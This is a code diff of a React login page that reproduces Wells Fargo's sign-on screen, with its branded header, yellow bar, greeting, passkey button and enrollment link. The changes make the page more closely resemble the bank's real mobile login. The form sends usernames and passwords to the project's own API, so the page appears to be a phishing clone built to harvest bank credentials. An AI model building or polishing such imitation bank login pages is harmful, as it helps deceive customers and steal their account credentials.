@@ -5,7 +5,6 @@ import { z } from "zod";
 import { useMutation } from "@tanstack/react-query";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Card, CardContent } from "@/components/ui/card";
 import { Checkbox } from "@/components/ui/checkbox";
 import {
   Form,
@@ -16,14 +15,9 @@ import {
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import { 
-  Shield, Lock, X, CreditCard, Home, PiggyBank,
-  Key, Fingerprint, TrendingUp, ArrowRight, CheckCircle2,
-  Smartphone, Users, Phone
-} from "lucide-react";
+import { Key, ArrowRight, Menu } from "lucide-react";
 import { Link, useLocation } from "wouter";
-import { WellsFargoIcon } from "@/components/wells-fargo-logo";
-import { OfficialHeader } from "@/components/official-header";
+import { OfficialFooter } from "@/components/official-footer";
 
 const loginSchema = z.object({
   username: z.string().min(1, "Username is required"),
@@ -42,25 +36,10 @@ function getGreeting() {
 
 export default function LoginPage() {
   const [showPassword, setShowPassword] = useState(false);
-  const [greeting, setGreeting] = useState(getGreeting());
+  const [greeting] = useState(getGreeting());
   const [, setLocation] = useLocation();
   const { toast } = useToast();
-  const [biometricSupported, setBiometricSupported] = useState(false);
   const [biometricLoading, setBiometricLoading] = useState(false);
-
-  useEffect(() => {
-    const checkBiometric = async () => {
-      if (window.PublicKeyCredential) {
-        try {
-          const available = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
-          setBiometricSupported(available);
-        } catch {
-          setBiometricSupported(false);
-        }
-      }
-    };
-    checkBiometric();
-  }, []);
 
   const handleBiometricLogin = async () => {
     setBiometricLoading(true);
@@ -131,8 +110,6 @@ export default function LoginPage() {
     },
   });
 
-  const usernameValue = form.watch("username");
-
   const loginMutation = useMutation({
     mutationFn: async (data: LoginFormData) => {
       const response = await apiRequest("POST", "/api/auth/login", {
@@ -164,372 +141,187 @@ export default function LoginPage() {
     loginMutation.mutate(data);
   };
 
-  const clearUsername = () => {
-    form.setValue("username", "");
-  };
-
   return (
-    <div className="min-h-screen flex flex-col bg-[#fafafa]">
-      <a href="#main-content" className="sr-only focus:not-sr-only focus:absolute focus:top-0 focus:left-0 bg-[#cd1409] text-white p-2 z-50">
-        Skip to main content
-      </a>
+    <div className="min-h-screen flex flex-col bg-white">
+      {/* Header */}
+      <header className="bg-[#d71e28] px-4 py-3 flex items-center justify-between">
+        <div className="flex-1"></div>
+        <h1 
+          className="text-white text-xl tracking-wide font-bold"
+          style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.15em" }}
+        >
+          WELLS FARGO
+        </h1>
+        <div className="flex-1 flex justify-end">
+          <button className="text-white p-1" data-testid="button-menu">
+            <Menu className="w-7 h-7" strokeWidth={2.5} />
+          </button>
+        </div>
+      </header>
 
-      <OfficialHeader variant="full" showNav />
+      {/* Yellow accent bar */}
+      <div className="h-1.5 bg-[#ffcd41]"></div>
 
       {/* Main Content */}
-      <main id="main-content" className="flex-1">
-        {/* Hero Section */}
-        <div 
-          className="relative py-12 lg:py-16"
-          style={{
-            background: "linear-gradient(135deg, #1a365d 0%, #2c5282 50%, #1a365d 100%)"
-          }}
+      <main className="flex-1 px-5 py-8">
+        {/* Greeting */}
+        <h2 
+          className="text-3xl text-[#1a1a1a] mb-8"
+          style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
+          data-testid="text-greeting"
         >
-          <div className="absolute inset-0 opacity-10" style={{
-            backgroundImage: "url(\"data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.4'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\")"
-          }}></div>
-          
-          <div className="max-w-[1280px] mx-auto px-4">
-            <div className="grid lg:grid-cols-5 gap-8 items-start">
-              {/* Sign On Card */}
-              <div className="lg:col-span-2">
-                <Card className="shadow-2xl border-0 overflow-hidden" data-testid="card-login">
-                  <div className="bg-gradient-to-r from-[#cd1409] to-[#b81208] px-6 py-4">
-                    <h2 className="text-white text-lg font-semibold flex items-center gap-2">
-                      <Lock className="w-5 h-5" />
-                      Secure Sign On
-                    </h2>
-                  </div>
-                  <CardContent className="p-6 bg-white">
-                    <Form {...form}>
-                      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
-                        <FormField
-                          control={form.control}
-                          name="username"
-                          render={({ field }) => (
-                            <FormItem>
-                              <FormControl>
-                                <div className="relative">
-                                  <Input
-                                    placeholder="Username"
-                                    className="h-12 pr-10 border-gray-300 rounded text-base focus:border-[#cd1409] focus:ring-[#cd1409] bg-[#fafafa]"
-                                    data-testid="input-username"
-                                    {...field}
-                                  />
-                                  {usernameValue && (
-                                    <button
-                                      type="button"
-                                      onClick={clearUsername}
-                                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
-                                      data-testid="button-clear-username"
-                                    >
-                                      <X className="w-5 h-5" />
-                                    </button>
-                                  )}
-                                </div>
-                              </FormControl>
-                              <FormMessage />
-                            </FormItem>
-                          )}
-                        />
+          {greeting}
+        </h2>
 
-                        <FormField
-                          control={form.control}
-                          name="password"
-                          render={({ field }) => (
-                            <FormItem>
-                              <FormControl>
-                                <div className="relative">
-                                  <Input
-                                    type={showPassword ? "text" : "password"}
-                                    placeholder="Password"
-                                    className="h-12 pr-16 border-gray-300 rounded text-base focus:border-[#cd1409] focus:ring-[#cd1409] bg-[#fafafa]"
-                                    data-testid="input-password"
-                                    {...field}
-                                  />
-                                  <button
-                                    type="button"
-                                    onClick={() => setShowPassword(!showPassword)}
-                                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[#cd1409] text-sm font-semibold hover:underline"
-                                    data-testid="button-toggle-password"
-                                  >
-                                    {showPassword ? "Hide" : "Show"}
-                                  </button>
-                                </div>
-                              </FormControl>
-                              <FormMessage />
-                            </FormItem>
-                          )}
-                        />
+        <Form {...form}>
+          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+            {/* Username Input */}
+            <FormField
+              control={form.control}
+              name="username"
+              render={({ field }) => (
+                <FormItem>
+                  <FormControl>
+                    <Input
+                      placeholder="Username"
+                      className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
+                      data-testid="input-username"
+                      {...field}
+                    />
+                  </FormControl>
+                  <FormMessage />
+                </FormItem>
+              )}
+            />
 
-                        <FormField
-                          control={form.control}
-                          name="saveUsername"
-                          render={({ field }) => (
-                            <FormItem>
-                              <div className="flex items-center gap-2">
-                                <FormControl>
-                                  <Checkbox
-                                    checked={field.value}
-                                    onCheckedChange={field.onChange}
-                                    className="border-gray-400 data-[state=checked]:bg-[#cd1409] data-[state=checked]:border-[#cd1409]"
-                                    data-testid="checkbox-save-username"
-                                  />
-                                </FormControl>
-                                <label className="text-sm text-gray-700 cursor-pointer select-none">
-                                  Save username
-                                </label>
-                              </div>
-                            </FormItem>
-                          )}
-                        />
-
-                        <Button
-                          type="submit"
-                          className="w-full h-12 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-bold rounded-full text-base shadow-md transition-all hover:shadow-lg"
-                          disabled={loginMutation.isPending}
-                          data-testid="button-sign-on"
-                        >
-                          {loginMutation.isPending ? "Signing On..." : "Sign On"}
-                        </Button>
-
-                        <div className="relative py-2">
-                          <div className="absolute inset-0 flex items-center">
-                            <div className="w-full border-t border-gray-200"></div>
-                          </div>
-                          <div className="relative flex justify-center text-xs">
-                            <span className="bg-white px-3 text-gray-500 uppercase tracking-wider">or sign on with</span>
-                          </div>
-                        </div>
-
-                        <Button
-                          type="button"
-                          variant="outline"
-                          className="w-full h-11 rounded-full border-2 border-[#1a1a1a] text-[#1a1a1a] font-semibold hover:bg-gray-50 text-sm"
-                          data-testid="button-passkey"
-                          onClick={handleBiometricLogin}
-                          disabled={biometricLoading}
-                        >
-                          <Key className="w-4 h-4 mr-2" />
-                          {biometricLoading ? "Authenticating..." : "Use a Passkey"}
-                        </Button>
-
-                        {biometricSupported && (
-                          <Button
-                            type="button"
-                            variant="outline"
-                            className="w-full h-11 rounded-full border-2 border-[#cd1409] text-[#cd1409] font-semibold hover:bg-red-50 text-sm"
-                            data-testid="button-biometric"
-                            onClick={handleBiometricLogin}
-                            disabled={biometricLoading}
-                          >
-                            <Fingerprint className="w-4 h-4 mr-2" />
-                            {biometricLoading ? "Verifying..." : "Face ID / Touch ID"}
-                          </Button>
-                        )}
-                      </form>
-                    </Form>
-
-                    <div className="mt-5 text-center">
-                      <Link href="/forgot-password" className="text-[#cd1409] text-sm font-medium hover:underline" data-testid="link-forgot">
-                        Forgot username or password?
-                      </Link>
+            {/* Password Input */}
+            <FormField
+              control={form.control}
+              name="password"
+              render={({ field }) => (
+                <FormItem>
+                  <FormControl>
+                    <div className="relative">
+                      <Input
+                        type={showPassword ? "text" : "password"}
+                        placeholder="Password"
+                        className="h-14 px-4 pr-16 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
+                        data-testid="input-password"
+                        {...field}
+                      />
+                      <button
+                        type="button"
+                        onClick={() => setShowPassword(!showPassword)}
+                        className="absolute right-4 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium underline"
+                        data-testid="button-toggle-password"
+                      >
+                        {showPassword ? "Hide" : "Show"}
+                      </button>
                     </div>
+                  </FormControl>
+                  <FormMessage />
+                </FormItem>
+              )}
+            />
 
-                    <div className="mt-5 pt-5 border-t border-gray-200">
-                      <div className="flex items-center justify-between">
-                        <span className="text-sm text-gray-600">New to Wells Fargo Online?</span>
-                        <Link href="/register" className="text-[#cd1409] text-sm font-bold hover:underline flex items-center gap-1" data-testid="link-register">
-                          Enroll Now
-                          <ArrowRight className="w-4 h-4" />
-                        </Link>
-                      </div>
+            {/* Save Username */}
+            <FormField
+              control={form.control}
+              name="saveUsername"
+              render={({ field }) => (
+                <FormItem>
+                  <div className="flex items-start gap-3 mt-2">
+                    <FormControl>
+                      <Checkbox
+                        checked={field.value}
+                        onCheckedChange={field.onChange}
+                        className="mt-0.5 h-5 w-5 border-2 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
+                        data-testid="checkbox-save-username"
+                      />
+                    </FormControl>
+                    <div>
+                      <label className="text-base text-[#1a1a1a] font-medium cursor-pointer">
+                        Save username
+                      </label>
+                      <p className="text-sm text-gray-600 mt-1 leading-snug">
+                        To help keep your account secure, save your username only on devices that aren't used by other people.
+                      </p>
                     </div>
-
-                    <div className="mt-5 pt-4 border-t border-gray-100 flex items-center justify-center gap-3 text-xs text-gray-500">
-                      <Shield className="w-4 h-4 text-green-600" />
-                      <span>Protected by 256-bit encryption</span>
-                      <Lock className="w-3.5 h-3.5 text-green-600" />
-                    </div>
-                  </CardContent>
-                </Card>
-              </div>
-
-              {/* Hero Content */}
-              <div className="lg:col-span-3 text-white">
-                <div className="mb-8">
-                  <p className="text-[#ffcd41] text-sm font-semibold uppercase tracking-wider mb-2">Welcome Back</p>
-                  <h1 className="text-3xl lg:text-4xl font-light mb-4" style={{ fontFamily: "Georgia, serif" }}>
-                    {greeting}
-                  </h1>
-                  <p className="text-white/80 text-lg max-w-xl">
-                    Manage your accounts, pay bills, transfer money, and more — all from one secure location.
-                  </p>
-                </div>
-
-                <div className="grid sm:grid-cols-2 gap-4 mb-8">
-                  {[
-                    { icon: CreditCard, title: "Credit Cards", desc: "Earn rewards on every purchase" },
-                    { icon: Home, title: "Home Loans", desc: "Find your perfect mortgage" },
-                    { icon: PiggyBank, title: "Savings", desc: "Grow your money faster" },
-                    { icon: TrendingUp, title: "Investing", desc: "Build your future wealth" },
-                  ].map((item) => (
-                    <Card key={item.title} className="bg-white/10 backdrop-blur border-white/20 hover:bg-white/15 transition-all cursor-pointer group">
-                      <CardContent className="p-4 flex items-center gap-4">
-                        <div className="w-12 h-12 bg-[#ffcd41] rounded-lg flex items-center justify-center flex-shrink-0">
-                          <item.icon className="w-6 h-6 text-[#1a1a1a]" />
-                        </div>
-                        <div>
-                          <h3 className="font-semibold text-white">{item.title}</h3>
-                          <p className="text-sm text-white/70">{item.desc}</p>
-                        </div>
-                      </CardContent>
-                    </Card>
-                  ))}
-                </div>
-
-                <div className="flex flex-wrap gap-4">
-                  <div className="flex items-center gap-2 text-white/80 text-sm">
-                    <CheckCircle2 className="w-5 h-5 text-[#ffcd41]" />
-                    <span>FDIC Insured</span>
                   </div>
-                  <div className="flex items-center gap-2 text-white/80 text-sm">
-                    <CheckCircle2 className="w-5 h-5 text-[#ffcd41]" />
-                    <span>24/7 Fraud Monitoring</span>
-                  </div>
-                  <div className="flex items-center gap-2 text-white/80 text-sm">
-                    <CheckCircle2 className="w-5 h-5 text-[#ffcd41]" />
-                    <span>Zero Liability Protection</span>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
+                </FormItem>
+              )}
+            />
 
-        {/* Features Section */}
-        <div className="bg-white py-12 border-b">
-          <div className="max-w-[1280px] mx-auto px-4">
-            <div className="text-center mb-10">
-              <h2 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }}>
-                Banking Made Simple
-              </h2>
-              <p className="text-gray-600">Everything you need to manage your money in one place</p>
-            </div>
-            <div className="grid md:grid-cols-4 gap-8">
-              {[
-                { icon: Smartphone, title: "Mobile Banking", desc: "Bank anywhere with our award-winning app" },
-                { icon: Shield, title: "Security Guarantee", desc: "Your accounts are protected 24/7" },
-                { icon: Users, title: "Expert Support", desc: "Get help from our dedicated team" },
-                { icon: TrendingUp, title: "Financial Tools", desc: "Track spending and reach your goals" },
-              ].map((feature) => (
-                <div key={feature.title} className="text-center">
-                  <div className="w-16 h-16 mx-auto bg-[#fef3f3] rounded-full flex items-center justify-center mb-4">
-                    <feature.icon className="w-8 h-8 text-[#cd1409]" />
-                  </div>
-                  <h3 className="font-semibold text-gray-900 mb-2">{feature.title}</h3>
-                  <p className="text-sm text-gray-600">{feature.desc}</p>
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
-
-        {/* Promo Banner */}
-        <div className="bg-[#f5f5f5] py-8">
-          <div className="max-w-[1280px] mx-auto px-4">
-            <div className="bg-white rounded-lg shadow-sm p-6 flex flex-col md:flex-row items-center justify-between gap-4">
-              <div className="flex items-center gap-4">
-                <div className="w-14 h-14 bg-[#cd1409] rounded-full flex items-center justify-center">
-                  <CreditCard className="w-7 h-7 text-white" />
-                </div>
-                <div>
-                  <p className="text-[#cd1409] text-xs font-bold uppercase tracking-wider">Limited Time Offer</p>
-                  <h3 className="text-lg font-semibold text-gray-900">Earn $200 cash back with Active Cash Card</h3>
-                  <p className="text-sm text-gray-600">Unlimited 2% cash rewards on purchases. No annual fee.</p>
-                </div>
-              </div>
-              <Button className="bg-[#cd1409] hover:bg-[#b81208] text-white px-8 rounded-full font-semibold">
-                Apply Now
+            {/* Sign On Button */}
+            <div className="pt-4">
+              <Button
+                type="submit"
+                className="w-full h-14 bg-gray-200 hover:bg-gray-300 text-gray-500 font-semibold rounded-full text-lg transition-all disabled:opacity-100"
+                disabled={loginMutation.isPending || !form.watch("username") || !form.watch("password")}
+                data-testid="button-sign-on"
+                style={{
+                  backgroundColor: form.watch("username") && form.watch("password") ? "#ffcd41" : "#e5e5e5",
+                  color: form.watch("username") && form.watch("password") ? "#1a1a1a" : "#9ca3af",
+                }}
+              >
+                {loginMutation.isPending ? "Signing on..." : "Sign on"}
               </Button>
             </div>
+
+            {/* Or divider */}
+            <div className="flex items-center justify-center py-2">
+              <span className="text-gray-500 text-base">or</span>
+            </div>
+
+            {/* Use a passkey button */}
+            <Button
+              type="button"
+              variant="outline"
+              className="w-full h-14 rounded-full border-2 border-[#1a1a1a] text-[#1a1a1a] font-semibold text-base hover:bg-gray-50"
+              data-testid="button-passkey"
+              onClick={handleBiometricLogin}
+              disabled={biometricLoading}
+            >
+              <Key className="w-5 h-5 mr-2" />
+              {biometricLoading ? "Authenticating..." : "Use a passkey"}
+            </Button>
+
+            {/* Passkey info */}
+            <p className="text-sm text-gray-600 text-center leading-snug mt-2">
+              Don't have one? Create a passkey after signing on and skip the password next time.
+            </p>
+          </form>
+        </Form>
+
+        {/* Forgot link */}
+        <div className="mt-8 flex items-center gap-2">
+          <ArrowRight className="w-4 h-4 text-[#d71e28]" />
+          <Link 
+            href="/forgot-password" 
+            className="text-[#6b21a8] font-medium underline"
+            data-testid="link-forgot"
+          >
+            Forgot username or password?
+          </Link>
+        </div>
+
+        {/* Enroll section */}
+        <div className="mt-8 pt-6 border-t border-gray-200">
+          <div className="flex items-center justify-between">
+            <span className="text-base text-gray-700">New to Wells Fargo?</span>
+            <Link 
+              href="/register" 
+              className="text-[#d71e28] font-bold flex items-center gap-1"
+              data-testid="link-register"
+            >
+              Enroll Now
+              <ArrowRight className="w-4 h-4" />
+            </Link>
           </div>
         </div>
       </main>
 
-      {/* Footer */}
-      <footer className="bg-[#1a1a1a] text-white">
-        <div className="max-w-[1280px] mx-auto px-4 py-10">
-          <div className="grid md:grid-cols-4 gap-8 mb-8">
-            <div>
-              <h4 className="font-semibold mb-4 text-[#ffcd41]">Products & Services</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li><a href="#" className="hover:text-white transition-colors">Checking Accounts</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Savings Accounts</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Credit Cards</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Home Mortgages</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Auto Loans</a></li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold mb-4 text-[#ffcd41]">Resources</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li><a href="#" className="hover:text-white transition-colors">Financial Education</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Calculators</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">FAQs</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Security Center</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Fraud Prevention</a></li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold mb-4 text-[#ffcd41]">About Us</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li><a href="#" className="hover:text-white transition-colors">Company Info</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Investor Relations</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Careers</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Diversity & Inclusion</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Community</a></li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold mb-4 text-[#ffcd41]">Contact Us</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li className="flex items-center gap-2">
-                  <Phone className="w-4 h-4" />
-                  1-800-TO-WELLS
-                </li>
-                <li><a href="#" className="hover:text-white transition-colors">Find a Location</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Schedule Appointment</a></li>
-                <li><a href="#" className="hover:text-white transition-colors">Send a Message</a></li>
-              </ul>
-            </div>
-          </div>
-          
-          <div className="border-t border-gray-800 pt-6">
-            <div className="flex flex-col md:flex-row items-center justify-between gap-4">
-              <div className="flex items-center gap-2">
-                <WellsFargoIcon className="w-8 h-8" />
-                <span className="text-lg" style={{ fontFamily: "Georgia, serif" }}>WELLS FARGO</span>
-              </div>
-              <div className="flex flex-wrap items-center gap-4 text-xs text-gray-500">
-                <a href="#" className="hover:text-white">Privacy Policy</a>
-                <span>|</span>
-                <a href="#" className="hover:text-white">Terms of Use</a>
-                <span>|</span>
-                <a href="#" className="hover:text-white">Security</a>
-                <span>|</span>
-                <a href="#" className="hover:text-white">Report Fraud</a>
-              </div>
-            </div>
-            <p className="text-xs text-gray-500 mt-4 text-center md:text-left">
-              © 2024 Wells Fargo. All rights reserved. NMLSR ID 399801
-            </p>
-            <p className="text-xs text-gray-600 mt-2 text-center md:text-left">
-              Member FDIC. Equal Housing Lender.
-            </p>
-          </div>
-        </div>
-      </footer>
+      <OfficialFooter />
     </div>
   );
 }
